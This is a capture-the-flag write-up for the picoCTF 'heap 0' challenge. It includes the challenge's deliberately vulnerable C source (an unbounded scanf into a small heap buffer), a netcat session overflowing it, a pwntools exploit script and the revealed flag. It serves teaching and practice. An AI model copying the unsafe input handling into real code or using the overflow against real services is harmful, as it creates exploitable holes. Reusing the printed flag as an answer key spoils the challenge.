# picoGym Level 438: heap 0
Source: https://play.picoctf.org/practice/challenge/438

## Goal
Are overflows just a stack concern?<br>
Download the binary here.<br>
https://artifacts.picoctf.net/c_tethys/13/chall<br>
Download the source here.<br>
https://artifacts.picoctf.net/c_tethys/13/chall.c<br>
Connect with the challenge instance here:<br>
nc tethys.picoctf.net 57973

## What I learned
```
Binary exploitation: practice of finding and using bugs in compiled programs (binaries) to change their behaviour

Manipulating heap memory
  Offset Misstep: Initial 19-byte payload (A*5 + B*11 + pwn3d) was too short—heap dump revealed 32 bytes needed
  safe_var changed, flag retrieved

AsianHacker-picoctf@webshell:~$ python3 -c "print('A'*66)"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

if safe variable "bico" equaled zero prints "No flage for you :("
  else equal zero prints flag
```

## Solution
```
https://webshell.picoctf.org/

AsianHacker-picoctf@webshell:~$ wget https://artifacts.picoctf.net/c_tethys/13/chall https://artifacts.picoctf.net/c_tethys/13/chall.c ⌨️
--2025-10-01 22:01:43--  https://artifacts.picoctf.net/c_tethys/13/chall
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 3.170.131.18, 3.170.131.33, 3.170.131.77, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|3.170.131.18|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20664 (20K) [application/octet-stream]
Saving to: 'chall'

chall                                                      100%[======================================================================================================================================>]  20.18K  --.-KB/s    in 0.008s  

2025-10-01 22:01:43 (2.40 MB/s) - 'chall' saved [20664/20664]

--2025-10-01 22:01:43--  https://artifacts.picoctf.net/c_tethys/13/chall.c
Reusing existing connection to artifacts.picoctf.net:443.
HTTP request sent, awaiting response... 200 OK
Length: 3345 (3.3K) [application/octet-stream]
Saving to: 'chall.c'

chall.c                                                    100%[======================================================================================================================================>]   3.27K  --.-KB/s    in 0s      

2025-10-01 22:01:43 (2.31 GB/s) - 'chall.c' saved [3345/3345]

FINISHED --2025-10-01 22:01:43--
Total wall clock time: 0.2s
Downloaded: 2 files, 23K in 0.008s (2.78 MB/s)

AsianHacker-picoctf@webshell:~$ cat chall.c ⌨️
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64 👀👀👀👀👀
// amount of memory allocated for input_data
#define INPUT_DATA_SIZE 5
// amount of memory allocated for safe_var
#define SAFE_VAR_SIZE 5

int num_allocs;
char *safe_var;
char *input_data;

void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r"); 👀
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}

void print_menu() {
    printf("\n1. Print Heap:\t\t(print the current state of the heap)"
           "\n2. Write to buffer:\t(write to your own personal block of data "
           "on the heap)"
           "\n3. Print safe_var:\t(I'll even let you look at my variable on "
           "the heap, "
           "I'm confident it can't be modified)"
           "\n4. Print Flag:\t\t(Try to print the flag, good luck)"
           "\n5. Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {
    printf("\nWelcome to heap0!\n");
    printf(
        "I put my data on the heap so it should be safe from any tampering.\n");
    printf("Since my data isn't on the stack I'll even let you write whatever "
           "info you want to the heap, I already took care of using malloc for "
           "you.\n\n");
    fflush(stdout);
    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, "pico", INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, "bico", SAFE_VAR_SIZE);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data); 👀 weakness
}

void print_heap() {
    printf("Heap State:\n");
    printf("+-------------+----------------+\n");
    printf("[*] Address   ->   Heap Data   \n");
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", safe_var, safe_var);
    printf("+-------------+----------------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();
    print_heap();

    int choice;

    while (1) {
        print_menu();
        int rval = scanf("%d", &choice);
        if (rval == EOF){
            exit(0);
        }
        if (rval != 1) {
            //printf("Invalid input. Please enter a valid choice.\n");
            //fflush(stdout);
            // Clear input buffer
            //while (getchar() != '\n');
            //continue;
            exit(0);
        }

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print safe_var
            printf("\n\nTake a look at my variable: safe_var = %s\n\n",
                   safe_var);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}

Method 1:
AsianHacker-picoctf@webshell:~$ nc tethys.picoctf.net 57973 ⌨️

Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x583941a182b0  ->   pico
+-------------+----------------+
[*]   0x583941a182d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4 ⌨️
Looks like everything is still secure!

No flage for you :(

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2 ⌨️
Data for buffer: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1 ⌨️
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x583941a182b0  ->   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+-------------+----------------+
[*]   0x583941a182d0  ->   aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa1
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4 ⌨️

YOU WIN
picoCTF{my_first_heap_overflow_4fa6dd49} 🔐

# Method 2:
AsianHacker-picoctf@webshell:~$ vi pythonScript.py ⌨️
AsianHacker-picoctf@webshell:~$ cat pythonScript.py ⌨️
#!/usr/bin/env python3
from pwn import *

context.log_level = 'info'

# Connect
p = remote('tethys.picoctf.net', 57973)
p.recvuntil(b'Enter your choice: ')

# Write to buffer
p.sendline(b'2')
p.recvuntil(b'Data for buffer: ')
payload = b'A' * 32 + b'pwn3d'  # 38 bytes
p.sendline(payload)
log.info(f'Sent payload: {payload}')

# Check win
p.sendlineafter(b'Enter your choice: ', b'4')
p.interactive()
AsianHacker-picoctf@webshell:~$ python3 pythonScript.py 
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /home/AsianHacker-picoctf/.cache/.pwntools-cache-3.10/update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] A newer version of pwntools is available on pypi (4.14.0 --> 4.14.1).
    Update with: $ pip install -U pwntools
[+] Opening connection to tethys.picoctf.net on port 57973: Done
[*] Sent payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApwn3d'
[*] Switching to interactive mode

YOU WIN
picoCTF{my_first_heap_overflow_4fa6dd49} 🔐
[*] Got EOF while reading in interactive
```

## Flag
picoCTF{my_first_heap_overflow_4fa6dd49}

## Continue
[Continue](./picoGym0433.md)